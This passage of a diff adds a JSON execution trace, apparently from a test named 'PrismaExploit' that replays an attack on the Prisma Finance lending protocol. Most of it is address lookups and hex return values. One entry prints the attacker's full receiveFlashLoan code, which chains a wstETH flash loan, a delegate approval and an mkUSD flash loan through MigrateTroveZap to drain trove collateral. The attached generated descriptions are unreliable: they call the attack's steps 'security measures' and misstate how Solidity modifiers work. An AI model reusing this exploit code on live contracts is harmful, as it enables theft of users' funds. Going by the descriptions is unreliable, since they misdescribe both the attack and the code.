+        "id": "3238",
+        "args": "0x1B72Bac3772050FDCaF468CcE7e20deb3cB02d89",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000018fdacb9a67bc5f"
+    },
+    {
+        "id": "3066",
+        "args": "0x1B72Bac3772050FDCaF468CcE7e20deb3cB02d89",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000018fdacb9a67bc5f"
+    },
+    {
+        "id": "13238",
+        "args": "0x9FceDEd3a0c838d1e73E88ddE466f197DF379f70",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000018eb066ccf05599"
+    },
+    {
+        "id": "13066",
+        "args": "0x9FceDEd3a0c838d1e73E88ddE466f197DF379f70",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000018eb066ccf05599"
+    },
+    {
+        "id": "3238",
+        "args": "0x9FceDEd3a0c838d1e73E88ddE466f197DF379f70",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000018eb066ccf05599"
+    },
+    {
+        "id": "3066",
+        "args": "0x9FceDEd3a0c838d1e73E88ddE466f197DF379f70",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000018eb066ccf05599"
+    },
+    {
+        "id": "13238",
+        "args": "0x14B30b46ec4fA1a993806bd5Dda4195C5a82353e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000018e3e249c18e24b"
+    },
+    {
+        "id": "13066",
+        "args": "0x14B30b46ec4fA1a993806bd5Dda4195C5a82353e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000018e3e249c18e24b"
+    },
+    {
+        "id": "3238",
+        "args": "0x14B30b46ec4fA1a993806bd5Dda4195C5a82353e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000018e3e249c18e24b"
+    },
+    {
+        "id": "3066",
+        "args": "0x14B30b46ec4fA1a993806bd5Dda4195C5a82353e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000018e3e249c18e24b"
+    },
+    {
+        "id": "13238",
+        "args": "0xc47faE56f3702737B69ed615950c01217ec5C7C8",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001867652df4a6b70"
+    },
+    {
+        "id": "13066",
+        "args": "0xc47faE56f3702737B69ed615950c01217ec5C7C8",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001867652df4a6b70"
+    },
+    {
+        "id": "3238",
+        "args": "0xc47faE56f3702737B69ed615950c01217ec5C7C8",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001867652df4a6b70"
+    },
+    {
+        "id": "3066",
+        "args": "0xc47faE56f3702737B69ed615950c01217ec5C7C8",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001867652df4a6b70"
+    },
+    {
+        "id": "13238",
+        "args": "0x19562DF3E7FD2aE7AF4e6Bd288b04C2C90405212",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000185c6646fe9626a"
+    },
+    {
+        "id": "13066",
+        "args": "0x19562DF3E7FD2aE7AF4e6Bd288b04C2C90405212",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000185c6646fe9626a"
+    },
+    {
+        "id": "3238",
+        "args": "0x19562DF3E7FD2aE7AF4e6Bd288b04C2C90405212",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000185c6646fe9626a"
+    },
+    {
+        "id": "3066",
+        "args": "0x19562DF3E7FD2aE7AF4e6Bd288b04C2C90405212",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000185c6646fe9626a"
+    },
+    {
+        "id": "13238",
+        "args": "0xf9Ca66Ef84C773faB422562ab41b1EE8d4397418",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000015cb9fecb1cb333"
+    },
+    {
+        "id": "13066",
+        "args": "0xf9Ca66Ef84C773faB422562ab41b1EE8d4397418",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000015cb9fecb1cb333"
+    },
+    {
+        "id": "3238",
+        "args": "0xf9Ca66Ef84C773faB422562ab41b1EE8d4397418",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000015cb9fecb1cb333"
+    },
+    {
+        "id": "3066",
+        "args": "0xf9Ca66Ef84C773faB422562ab41b1EE8d4397418",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000015cb9fecb1cb333"
+    },
+    {
+        "id": "13238",
+        "args": "0x183D0567c33e7591c22540E45D2F74730b42a0ca",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000013f35db5e3976a5"
+    },
+    {
+        "id": "13066",
+        "args": "0x183D0567c33e7591c22540E45D2F74730b42a0ca",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000013f35db5e3976a5"
+    },
+    {
+        "id": "3238",
+        "args": "0x183D0567c33e7591c22540E45D2F74730b42a0ca",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000013f35db5e3976a5"
+    },
+    {
+        "id": "3066",
+        "args": "0x183D0567c33e7591c22540E45D2F74730b42a0ca",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000013f35db5e3976a5"
+    },
+    {
+        "id": "13238",
+        "args": "0xA22eb3338dFd69458513a1F6D4742AB29F7eF333",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001111ad251191be0"
+    },
+    {
+        "id": "13066",
+        "args": "0xA22eb3338dFd69458513a1F6D4742AB29F7eF333",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001111ad251191be0"
+    },
+    {
+        "id": "3238",
+        "args": "0xA22eb3338dFd69458513a1F6D4742AB29F7eF333",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001111ad251191be0"
+    },
+    {
+        "id": "3066",
+        "args": "0xA22eb3338dFd69458513a1F6D4742AB29F7eF333",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000001111ad251191be0"
+    },
+    {
+        "id": "13238",
+        "args": "0x599275bE9753Ecd8E6c380A7Ef78E38711b8F212",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000010c35b268575e5a"
+    },
+    {
+        "id": "13066",
+        "args": "0x599275bE9753Ecd8E6c380A7Ef78E38711b8F212",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000010c35b268575e5a"
+    },
+    {
+        "id": "3238",
+        "args": "0x599275bE9753Ecd8E6c380A7Ef78E38711b8F212",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000010c35b268575e5a"
+    },
+    {
+        "id": "3066",
+        "args": "0x599275bE9753Ecd8E6c380A7Ef78E38711b8F212",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000010c35b268575e5a"
+    },
+    {
+        "id": "13238",
+        "args": "0xD143Ed1aE715Fb149cb2356Ca18138E29D308E72",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000107a16ce347ff6f"
+    },
+    {
+        "id": "13066",
+        "args": "0xD143Ed1aE715Fb149cb2356Ca18138E29D308E72",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000107a16ce347ff6f"
+    },
+    {
+        "id": "3238",
+        "args": "0xD143Ed1aE715Fb149cb2356Ca18138E29D308E72",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000107a16ce347ff6f"
+    },
+    {
+        "id": "3066",
+        "args": "0xD143Ed1aE715Fb149cb2356Ca18138E29D308E72",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000107a16ce347ff6f"
+    },
+    {
+        "id": "13238",
+        "args": "0x3F3E305C4Ad49271EBDA489dd43d2c8F027d2D41",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000010437bf72e0b0a7"
+    },
+    {
+        "id": "13066",
+        "args": "0x3F3E305C4Ad49271EBDA489dd43d2c8F027d2D41",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000010437bf72e0b0a7"
+    },
+    {
+        "id": "3238",
+        "args": "0x3F3E305C4Ad49271EBDA489dd43d2c8F027d2D41",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000010437bf72e0b0a7"
+    },
+    {
+        "id": "3066",
+        "args": "0x3F3E305C4Ad49271EBDA489dd43d2c8F027d2D41",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000010437bf72e0b0a7"
+    },
+    {
+        "id": "13238",
+        "args": "0x1428BD476719AeCD9db6A21396A9E1C3865A9382",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000e8d08313fa8682"
+    },
+    {
+        "id": "13066",
+        "args": "0x1428BD476719AeCD9db6A21396A9E1C3865A9382",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000e8d08313fa8682"
+    },
+    {
+        "id": "3238",
+        "args": "0x1428BD476719AeCD9db6A21396A9E1C3865A9382",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000e8d08313fa8682"
+    },
+    {
+        "id": "3066",
+        "args": "0x1428BD476719AeCD9db6A21396A9E1C3865A9382",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000e8d08313fa8682"
+    },
+    {
+        "id": "13238",
+        "args": "0x308fD47D492cF32D0f504c2a3E82BC25583B455B",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000dea6968c07ac9d"
+    },
+    {
+        "id": "13066",
+        "args": "0x308fD47D492cF32D0f504c2a3E82BC25583B455B",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000dea6968c07ac9d"
+    },
+    {
+        "id": "3238",
+        "args": "0x308fD47D492cF32D0f504c2a3E82BC25583B455B",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000dea6968c07ac9d"
+    },
+    {
+        "id": "3066",
+        "args": "0x308fD47D492cF32D0f504c2a3E82BC25583B455B",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000dea6968c07ac9d"
+    },
+    {
+        "id": "13238",
+        "args": "0x0c98361F38Ed48A5a287Cc8e4d07f22E5FcbcaCF",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000dd95213183f3aa"
+    },
+    {
+        "id": "13066",
+        "args": "0x0c98361F38Ed48A5a287Cc8e4d07f22E5FcbcaCF",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000dd95213183f3aa"
+    },
+    {
+        "id": "3238",
+        "args": "0x0c98361F38Ed48A5a287Cc8e4d07f22E5FcbcaCF",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000dd95213183f3aa"
+    },
+    {
+        "id": "3066",
+        "args": "0x0c98361F38Ed48A5a287Cc8e4d07f22E5FcbcaCF",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000dd95213183f3aa"
+    },
+    {
+        "id": "13238",
+        "args": "0x17ad4E76e67E9937A2B2EF882e4042Dd00Cc60F7",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000d522f26afe0298"
+    },
+    {
+        "id": "13066",
+        "args": "0x17ad4E76e67E9937A2B2EF882e4042Dd00Cc60F7",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000d522f26afe0298"
+    },
+    {
+        "id": "3238",
+        "args": "0x17ad4E76e67E9937A2B2EF882e4042Dd00Cc60F7",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000d522f26afe0298"
+    },
+    {
+        "id": "3066",
+        "args": "0x17ad4E76e67E9937A2B2EF882e4042Dd00Cc60F7",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000d522f26afe0298"
+    },
+    {
+        "id": "13238",
+        "args": "0x82af4e3930590bf2b3Eaa386d1875c0b5A3A7ED1",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000b18d6268261893"
+    },
+    {
+        "id": "13066",
+        "args": "0x82af4e3930590bf2b3Eaa386d1875c0b5A3A7ED1",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000b18d6268261893"
+    },
+    {
+        "id": "3238",
+        "args": "0x82af4e3930590bf2b3Eaa386d1875c0b5A3A7ED1",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000b18d6268261893"
+    },
+    {
+        "id": "3066",
+        "args": "0x82af4e3930590bf2b3Eaa386d1875c0b5A3A7ED1",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000b18d6268261893"
+    },
+    {
+        "id": "13238",
+        "args": "0x774bB9306DF1cd921eb842b1388c78f75e6Ef79F",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000838a25da6dc459"
+    },
+    {
+        "id": "13066",
+        "args": "0x774bB9306DF1cd921eb842b1388c78f75e6Ef79F",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000838a25da6dc459"
+    },
+    {
+        "id": "3238",
+        "args": "0x774bB9306DF1cd921eb842b1388c78f75e6Ef79F",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000838a25da6dc459"
+    },
+    {
+        "id": "3066",
+        "args": "0x774bB9306DF1cd921eb842b1388c78f75e6Ef79F",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000838a25da6dc459"
+    },
+    {
+        "id": "13238",
+        "args": "0x0b45eFFF60111a060B2CAcc55407029660fD5423",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000007e2a9c05eec139"
+    },
+    {
+        "id": "13066",
+        "args": "0x0b45eFFF60111a060B2CAcc55407029660fD5423",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000007e2a9c05eec139"
+    },
+    {
+        "id": "3238",
+        "args": "0x0b45eFFF60111a060B2CAcc55407029660fD5423",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000007e2a9c05eec139"
+    },
+    {
+        "id": "3066",
+        "args": "0x0b45eFFF60111a060B2CAcc55407029660fD5423",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000007e2a9c05eec139"
+    },
+    {
+        "id": "10880",
+        "args": "0xcC7218100da61441905e0c327749972e3CBee9EE, 0x1CC79f3F47BfC060b6F761FcD1afC6D399a968B6, 463184447350099685758 [4.631e20]",
+        "original_code": "    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) external returns (bool);\n}\n",
+        "description": "1. Core functions:  \nThe `transferFrom` function is designed to move a specified amount of tokens from one address (`from`) to another address (`to`). This function is commonly used in scenarios where a third party (like a smart contract or another user) is authorized to transfer tokens on behalf of the token owner. It ensures that tokens can be transferred securely and efficiently between accounts.\n\n2. Security mechanism:  \nThe function is marked as `external`, meaning it can only be called from outside the contract, ensuring that internal contract logic cannot misuse it. Additionally, the function typically relies on an allowance mechanism, where the `from` address must have previously approved the caller to spend a certain amount of tokens. This approval process acts as a safeguard to prevent unauthorized transfers.\n\n3. Parameter Function:  \n- `from`: This is the address from which the tokens will be transferred. It must hold the required amount of tokens.  \n- `to`: This is the address that will receive the tokens.  \n- `amount`: This specifies the number of tokens to be transferred. It must be a positive value and cannot exceed the balance of the `from` address or the approved allowance.  \n\n4. Return description:  \nThe function returns a boolean value (`true` or `false`) to indicate whether the transfer was successful. If the transfer is completed without issues, it returns `true`. If there are any problems (e.g., insufficient balance or allowance), it returns `false`.  \n\nIn summary, the `transferFrom` function facilitates the transfer of tokens between addresses, ensures security through an allowance mechanism, and provides clear feedback on the success or failure of the operation.",
+        "return_value": "true"
+    },
+    {
+        "id": "5490",
+        "args": "0xcC7218100da61441905e0c327749972e3CBee9EE, 1443398534054748145744620 [1.443e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "359",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000fdce0267803c6a0d209d3721d2f01fd618e9cbf8"
+    },
+    {
+        "id": "1197270",
+        "args": "PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], [0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0], [1000000000000000000 [1e18]], 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2534",
+        "args": "0xBA12222222228d8Ba445958a75a0704d566BF2C8",
+        "original_code": null,
+        "description": null,
+        "return_value": "17276798879541410536597 [1.727e22]"
+    },
+    {
+        "id": "2350",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "26068",
+        "args": "PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000000000000 [1e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1147703",
+        "args": "[0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0], [1000000000000000000 [1e18]], [0], 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": "    function receiveFlashLoan(\n        IERC20[] memory, /* tokens */\n        uint256[] memory, /* amounts */\n        uint256[] memory, /* feeAmounts */\n        bytes memory /* userData */\n    ) external {\n        // approve borowOperations to spend wstETH with max amount\n        IERC20(wstETH).approve(address(BorrowerOperations), type(uint256).max);\n\n        // set delegate approval\n        IBorrowerOperations(BorrowerOperations).setDelegateApproval(address(MigrateTroveZap), true);\n\n        // // open trove\n        IBorrowerOperations(BorrowerOperations).openTrove(\n            address(TroveManager),\n            address(this),\n            5_000_000_325_833_471,\n            1_000_000_000_000_000_000,\n            2_000_000_000_000_000_000_000,\n            address(upperHint),\n            address(lowerHint)\n        );\n\n        // // another mkUSD loan\n        // // // data\n        // bytes memory data = hex\"000000000000000000000000d996073019c74b2fb94ead236e32032405bc027c0000000000000000000000001cc79f3f47bfc060b6f761fcd1afc6d399a968b60000000000000000000000001cc79f3f47bfc060b6f761fcd1afc6d399a968b60000000000000000000000000000000000000000000000000011c3794b4c52ff0000000000000000000000000000000000000000000000458a6330674daf1a93000000000000000000000000e87c6f39881d5bf51cf46d3dc7e1c1731c2f790a00000000000000000000000089ee26fcdff6b109f81abc6876600ec427f7907f\";\n\n        uint256 amount = 2_000_000_000_000_000_000_000;\n\n        address account = address(this);\n        address troveManagerFrom = address(TroveManager);\n        address troveManagerTo = address(TroveManager);\n        uint256 maxFeePercentage = 5_000_000_325_833_471;\n        uint256 coll = 1_282_797_208_306_130_557_587;\n\n        bytes memory data = abi.encode(\n            account, troveManagerFrom, troveManagerTo, maxFeePercentage, coll, address(upperHint), address(lowerHint)\n        );\n\n        IMKUSDLoan(mkUSD).flashLoan(IERC3156FlashBorrower(address(MigrateTroveZap)), address(mkUSD), amount, data);\n\n        // cuurent contract mkUSD balance\n        // console2.log(\"mkUSD balance before closing the trove: \", IERC20(mkUSD).balanceOf(address(this)));\n\n        // close trove\n        IBorrowerOperations(BorrowerOperations).closeTrove(address(TroveManager), address(this));\n\n        uint256 returnAmount = 1_000_000_000_000_000_000;\n        // transfer the wstETH loan back to the vault\n        IERC20(wstETH).transfer(address(vault), returnAmount);\n\n        // current contract wstETH balance\n        console2.log(\"wstETH balance ~1281.79 ETH after attack: \", IERC20(wstETH).balanceOf(address(this)));\n    }\n",
+        "description": "1. **Core functions:**  \n   The `receiveFlashLoan` function is designed to handle a flash loan operation. It first approves another contract (`BorrowerOperations`) to spend a specific token (`wstETH`) without any limit. Then, it sets a delegate approval for a migration contract (`MigrateTroveZap`). After that, it opens a \"trove\" (a type of loan position) with specific parameters, such as collateral and debt amounts. Next, it initiates a flash loan for another token (`mkUSD`) and encodes data for the loan operation. Finally, it closes the trove, transfers a portion of the `wstETH` back to a vault, and logs the remaining balance of `wstETH`.\n\n2. **Security mechanism:**  \n   The function includes several security measures:  \n   - It uses `approve` to limitlessly allow `BorrowerOperations` to spend `wstETH`, ensuring the operation can proceed without restrictions.  \n   - It sets a delegate approval for `MigrateTroveZap`, ensuring only authorized contracts can perform certain actions.  \n   - It uses `flashLoan` to borrow `mkUSD`, which must be repaid within the same transaction, reducing the risk of default.  \n   - It logs the `wstETH` balance after the operation, providing transparency and traceability.  \n\n3. **Parameter Function:**  \n   The function takes four parameters, but they are not used directly in the logic:  \n   - `tokens`: An array of tokens involved in the flash loan (unused).  \n   - `amounts`: An array of amounts for each token (unused).  \n   - `feeAmounts`: An array of fees for each token (unused).  \n   - `userData`: Additional data for the flash loan (unused).  \n   Instead, the function relies on hardcoded values and external contract interactions to perform its tasks.\n\n4. **Return description:**  \n   The function does not return any value. Its primary purpose is to execute a series of operations, including approving token spending, opening and closing a trove, and handling a flash loan. The final step logs the remaining `wstETH` balance, which serves as a checkpoint for verifying the operation's outcome.\n\n**In summary,**  \nThe `receiveFlashLoan` function manages a complex financial operation involving flash loans, trove management, and token transfers. It ensures security through approvals, delegate settings, and logging, while relying on hardcoded values and external contracts to execute its tasks. The function does not return any value but logs the final balance of `wstETH` for verification.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "24584",
+        "args": "0x72c590349535AD52e6953744cb2A36B409542719, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": "    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n",
+        "description": "1. Core functions:  \nThe `approve` function allows the caller (the owner of tokens) to give permission to another address (the `spender`) to spend a specific amount of tokens on their behalf. This is a common function in token contracts to enable delegated spending.\n\n2. Security mechanism:  \n- The function uses the `public` modifier, making it accessible to anyone.  \n- It includes the `virtual` and `override` keywords, indicating it can be overridden by derived contracts and is overriding a function from a parent contract.  \n- The `_msgSender()` function ensures the caller's address is securely retrieved, protecting against potential manipulation.  \n\n3. Parameter Function:  \n- `spender`: The address that is being granted permission to spend tokens.  \n- `amount`: The maximum number of tokens the `spender` is allowed to spend.  \n\n4. Return description:  \nThe function always returns `true` to indicate that the approval operation was successful. It does not perform any complex calculations but simply confirms the action.  \n\nIn summary, the `approve` function enables token owners to delegate spending rights to another address, with built-in security measures to ensure the caller's identity is verified and the operation is confirmed.",
+        "return_value": "true"
+    },
+    {
+        "id": "22724",
+        "args": "0xcC7218100da61441905e0c327749972e3CBee9EE, true",
+        "original_code": "    function setDelegateApproval(address _delegate, bool _isApproved) external {\n        isApprovedDelegate[msg.sender][_delegate] = _isApproved;\n    }\n}\n",
+        "description": "1. Core functions:  \nThis function allows a user to set or change the approval status of a delegate. It determines whether a specific delegate (another address) is authorized to perform certain actions on behalf of the user. Essentially, it manages permissions between the user and the delegate.\n\n2. Security mechanism:  \nThe function uses the `external` modifier, which ensures it can only be called from outside the contract. This prevents internal misuse. Additionally, it relies on `msg.sender` to identify the caller, ensuring only the user can modify their own delegate approvals.\n\n3. Parameter Function:  \n- `_delegate`: This is the address of the delegate whose approval status is being set or changed.  \n- `_isApproved`: This is a boolean value (`true` or `false`) that indicates whether the delegate is approved or not.\n\n4. Return description:  \nThe function does not return any value. It simply updates the `isApprovedDelegate` mapping, which stores the approval status of the delegate for the caller (`msg.sender`).\n\nIn summary, this function lets a user approve or revoke a delegate's permissions, ensuring only the user can make these changes. It uses basic security measures to protect the process.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "578739",
+        "args": "0x1CC79f3F47BfC060b6F761FcD1afC6D399a968B6, PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5000000325833471 [5e15], 1000000000000000000 [1e18], 2000000000000000000000 [2e21], 0xE87C6f39881D5bF51Cf46d3Dc7E1c1731C2f790A, 0x89Ee26FCDFF6B109F81ABC6876600eC427F7907F",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "417",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "6464",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000384fda33b46f0f7c0d90000000000000000000000000000000000000000000bf28565a1c01af513b7470000000000000000000000000000000000000000000000e144c24c9b85360bf9"
+    },
+    {
+        "id": "6286",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000384fda33b46f0f7c0d90000000000000000000000000000000000000000000bf28565a1c01af513b7470000000000000000000000000000000000000000000000e144c24c9b85360bf9"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0",
+        "original_code": null,
+        "description": null,
+        "return_value": "4155472023355548634105 [4.155e21]"
+    },
+    {
+        "id": "6464",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000127f5d91cf416dd86cb0000000000000000000000000000000000000000000530462e8db43db3547dff0000000000000000000000000000000000000000000000d565996e9cad7b3110"
+    },
+    {
+        "id": "6286",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000127f5d91cf416dd86cb0000000000000000000000000000000000000000000530462e8db43db3547dff0000000000000000000000000000000000000000000000d565996e9cad7b3110"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0xae78736Cd615f374D3085123A210448E74Fc6393",
+        "original_code": null,
+        "description": null,
+        "return_value": "3936477491988606431504 [3.936e21]"
+    },
+    {
+        "id": "6464",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000001269a48eb70f454e02c000000000000000000000000000000000000000000048ace2485935989583e4d0000000000000000000000000000000000000000000000ce9063dd0c70193214"
+    },
+    {
+        "id": "6286",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000001269a48eb70f454e02c000000000000000000000000000000000000000000048ace2485935989583e4d0000000000000000000000000000000000000000000000ce9063dd0c70193214"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0xBe9895146f7AF43049ca1c1AE358B0541Ea49704",
+        "original_code": null,
+        "description": null,
+        "return_value": "3810433681793813656084 [3.81e21]"
+    },
+    {
+        "id": "6464",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000295ec15fd02a94f13040000000000000000000000000000000000000000000532ca09d52425da5200400000000000000000000000000000000000000000000000cf0596ca7d7873ea49"
+    },
+    {
+        "id": "6286",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000295ec15fd02a94f13040000000000000000000000000000000000000000000532ca09d52425da5200400000000000000000000000000000000000000000000000cf0596ca7d7873ea49"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0xac3E018457B222d93114458476f3E3416Abbe38F",
+        "original_code": null,
+        "description": null,
+        "return_value": "3818878755114814007881 [3.818e21]"
+    },
+    {
+        "id": "5591",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000d322ab891551282050000000000000000000000000000000000000000000042feab6f836495515a7290000000000000000000000000000000000000000000000e144c24c9b85360bf9"
+    },
+    {
+        "id": "5413",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000d322ab891551282050000000000000000000000000000000000000000000042feab6f836495515a7290000000000000000000000000000000000000000000000e144c24c9b85360bf9"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
